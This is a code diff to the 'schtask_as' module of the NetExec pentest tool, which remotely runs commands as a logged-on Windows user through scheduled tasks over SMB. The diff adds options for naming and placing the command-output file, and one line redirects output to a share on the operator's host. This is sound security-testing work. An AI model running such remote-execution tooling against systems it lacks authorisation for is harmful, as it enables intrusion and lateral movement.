@@ -18,16 +18,26 @@ class NXCModule:
         """
         CMD            Command to execute
         USER           User to execute command as
+        TASK           Set a name for the scheduled task name
+        FILE           Set a name for the command output file
+        LOCATION       Set a location for the command output file
         """
-        self.cmd = self.user = self.task = self.time = None
+        self.cmd = self.user = self.task = self.file = self.location = self.time = None
         if "CMD" in module_options:
             self.cmd = module_options["CMD"]
 
         if "USER" in module_options:
             self.user = module_options["USER"]
+            
         if "TASK" in module_options:
             self.task = module_options["TASK"]
             
+        if "FILE" in module_options:
+            self.file = module_options["FILE"]
+ 
+        if "LOCATION" in module_options:
+            self.location = module_options["LOCATION"]
+           
     name = "schtask_as"
     description = "Remotely execute a scheduled task as a logged on user"
     supported_protocols = ["smb"]
@@ -53,7 +63,9 @@ class NXCModule:
                 connection.domain,
                 self.user,
                 self.cmd,
+                self.file,
                 self.task,
+                self.location,
                 connection.kerberos,
                 connection.aesKey,
                 connection.host,
@@ -82,7 +94,7 @@ class NXCModule:
 
 
 class TSCH_EXEC:
-    def __init__(self, target, share_name, username, password, domain, user, cmd, task2, doKerberos=False, aesKey=None, remoteHost=None, kdcHost=None, hashes=None, logger=None, tries=None, share=None):
+    def __init__(self, target, share_name, username, password, domain, user, cmd, file2, task2, location, doKerberos=False, aesKey=None, remoteHost=None, kdcHost=None, hashes=None, logger=None, tries=None, share=None):
         self.__target = target
         self.__username = username
         self.__password = password
@@ -102,7 +114,10 @@ class TSCH_EXEC:
         self.logger = logger
         self.cmd = cmd
         self.user = user
+        self.file = file2
         self.task = task2
+        self.location = location
+        
 
         if hashes is not None:
             if hashes.find(":") != -1:
@@ -185,10 +200,14 @@ class TSCH_EXEC:
       <Command>cmd.exe</Command>
 """
         if self.__retOutput:
-            if self.task is None:
-                self.__output_filename = f"\\Windows\\Temp\\{gen_random_string(6)}"
+            if self.location is None:
+                fileLocation = "\\Windows\\Temp\\"
+            else:
+                fileLocation = self.location
+            if self.file is None:
+                self.__output_filename = f"{fileLocation}{gen_random_string(6)}"
             else: 	
-                self.__output_filename = f"\\Windows\\Temp\\{self.task}"
+                self.__output_filename = f"{fileLocation}{self.file}"
             if fileless:
                 local_ip = self.__rpctransport.get_socket().getsockname()[0]
                 argument_xml = f"      <Arguments>/C {command} &gt; \\\\{local_ip}\\{self.__share_name}\\{self.__output_filename} 2&gt;&amp;1</Arguments>"
